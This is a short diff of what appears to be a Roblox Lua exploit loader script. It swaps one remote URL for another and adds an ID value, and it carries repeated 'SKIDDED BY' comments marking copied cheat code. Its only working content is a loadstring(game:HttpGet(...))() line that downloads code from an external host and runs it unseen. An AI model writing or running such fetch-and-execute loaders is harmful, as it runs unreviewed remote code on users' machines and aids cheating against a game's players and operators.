@@ -1,4 +1,5 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/HEiwZj56bckBM5C4/raw", true))()
+ID="48e7b2ee-fd48-4681-8cea-5ea7b072d102";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 -- SKIDDED BY SIGMA @rizzify101
 -- SKIDDED BY SIGMA @rizzify101
 -- SKIDDED BY SIGMA @rizzify101
